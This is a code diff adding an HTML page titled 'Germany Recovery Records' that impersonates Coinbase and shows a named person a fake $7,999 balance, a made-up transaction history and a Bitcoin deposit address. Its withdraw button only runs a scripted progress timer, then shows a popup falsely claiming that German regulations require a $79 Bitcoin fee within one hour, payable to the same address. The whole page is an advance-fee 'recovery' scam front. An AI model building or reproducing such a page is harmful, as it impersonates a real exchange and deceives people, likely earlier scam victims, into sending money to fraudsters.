@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Germany Recovery Records</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.4.0/axios.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
+</head>
+<body class="bg-gray-900 text-white font-sans">
+
+  <div class="flex">
+    <!-- Sidebar -->
+    <aside class="w-64 bg-blue-900 p-6 border-r border-blue-800">
+      <div class="text-center mb-8">
+        <h1 class="text-3xl font-bold text-white lowercase">coinbase</h1>
+      </div>
+      <div class="space-y-4">
+        <button onclick="showSection('fund')" class="w-full bg-blue-600 text-white py-2 rounded-full">Fund Account</button>
+        <button onclick="showSection('withdraw')" class="w-full bg-blue-800 text-white py-2 rounded-full">Withdraw</button>
+      </div>
+      <div class="mt-10 text-white text-sm uppercase space-y-2">
+        <p>Germany Recovery Records</p>
+        <p>Germany Recovery Records</p>
+      </div>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="flex-1 p-8 bg-gray-800">
+      <!-- Header -->
+      <div class="flex items-center justify-between mb-6">
+        <div>
+          <h2 class="text-xl text-gray-300">Current Balance</h2>
+          <p class="text-5xl font-extrabold text-white">$7,999</p>
+        </div>
+        <div class="flex items-center space-x-4">
+          <div class="text-right">
+            <p class="text-lg font-semibold">Randi Perrone-Kerfoot</p>
+          </div>
+          <img src="https://www.gravatar.com/avatar?d=mp&s=100" alt="User Profile" class="w-16 h-16 rounded-full border-2 border-blue-600" />
+        </div>
+      </div>
+
+      <!-- BTC Price -->
+      <div class="mb-6">
+        <h2 class="text-2xl font-bold mb-2">Bitcoin Price</h2>
+        <p id="btcPrice" class="text-lg text-green-400">Loading...</p>
+      </div>
+
+      <!-- Fund Section -->
+      <section id="fundSection" class="hidden">
+        <h2 class="text-xl font-bold mb-4">Fund Account</h2>
+        <p class="mb-2">Send Bitcoin to:</p>
+        <p class="font-mono bg-gray-700 p-2 rounded mb-4">bc1qas3rhc2hm2puwf0muz3u2wwhtl6hu0lcyqk24n</p>
+        <div id="qrcode" class="mb-6"></div>
+      </section>
+
+      <!-- Withdraw Section -->
+      <section id="withdrawSection" class="hidden">
+        <h2 class="text-xl font-bold mb-4">Withdraw</h2>
+        <div class="space-y-2">
+          <input type="text" placeholder="Wallet Address" class="w-full bg-gray-700 p-2 rounded" />
+          <input type="text" placeholder="Amount (BTC)" class="w-full bg-gray-700 p-2 rounded" />
+          <button onclick="startWithdraw()" class="bg-blue-600 px-4 py-2 rounded">Confirm</button>
+        </div>
+      </section>
+
+      <!-- Transaction History -->
+      <section class="mt-10">
+        <h2 class="text-xl font-bold mb-4">Transaction History</h2>
+        <div class="max-h-64 overflow-y-auto space-y-2 pr-2">
+          <li class="bg-gray-700 p-2 rounded">[08/29/2025] Deposit +0.3210 BTC</li>
+          <li class="bg-gray-700 p-2 rounded">[08/28/2025] Withdrawal -0.3000 BTC</li>
+          <li class="bg-gray-700 p-2 rounded">[08/27/2025] Deposit +0.3232 BTC</li>
+          <li class="bg-gray-700 p-2 rounded">[08/26/2025] Withdrawal -0.3310 BTC</li>
+          <li class="bg-gray-700 p-2 rounded">[08/25/2025] Deposit +0.4885 BTC</li>
+        </div>
+      </section>
+    </main>
+  </div>
+
+  <!-- Error Popup -->
+  <div id="errorPopup" class="fixed top-0 left-0 w-full h-full bg-black bg-opacity-80 flex items-center justify-center hidden">
+    <div class="bg-gray-800 p-6 rounded-lg text-center max-w-md border border-yellow-400">
+      <h3 class="text-yellow-400 text-xl font-bold mb-2">$79 Bitcoin Fee Required</h3>
+      <p class="text-sm mb-4">A fee is required by German cryptocurrency regulations and must be paid within one hour. Failure to pay may result in penalties.</p>
+      <p class="text-sm mb-2">Fee Address:</p>
+      <p class="font-mono bg-gray-700 p-2 rounded mb-4">bc1qas3rhc2hm2puwf0muz3u2wwhtl6hu0lcyqk24n</p>
+      <button onclick="closePopup()" class="bg-blue-600 px-4 py-2 rounded">OK</button>
+    </div>
+  </div>
+
+  <!-- Scripts -->
+  <script>
+    function showSection(section) {
+      document.getElementById('fundSection').style.display = section === 'fund' ? 'block' : 'none';
+      document.getElementById('withdrawSection').style.display = section === 'withdraw' ? 'block' : 'none';
+    }
+
+    function startWithdraw() {
+      let progress = 0;
+      const interval = setInterval(() => {
+        progress++;
+        if (progress >= 99) {
+          clearInterval(interval);
+          document.getElementById('errorPopup').style.display = 'flex';
+        }
+      }, 220); // 22 seconds total
+    }
+
+    function closePopup() {
+      document.getElementById('errorPopup').style.display = 'none';
+    }
+
+    async function fetchBTCPrice() {
+      try {
+        const res = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
+        const price = res.data.bitcoin.usd;
+        document.getElementById('btcPrice').innerText = `$${price.toLocaleString()} USD`;
+      } catch (err) {
+        document.getElementById('btcPrice').innerText = 'Error fetching price';
+      }
+    }
+
+    fetchBTCPrice();
+    setInterval(fetchBTCPrice, 10000); // Update every 10 seconds
+
+    // QR Code Generation
+    QRCode.toCanvas(document.getElementById("qrcode"), "bc1qas3rhc2hm2puwf0muz3u2wwhtl6hu0lcyqk24n", function (error) {
+      if (error) console.error(error);
+    });
+  </script>
+</body>
+</html>
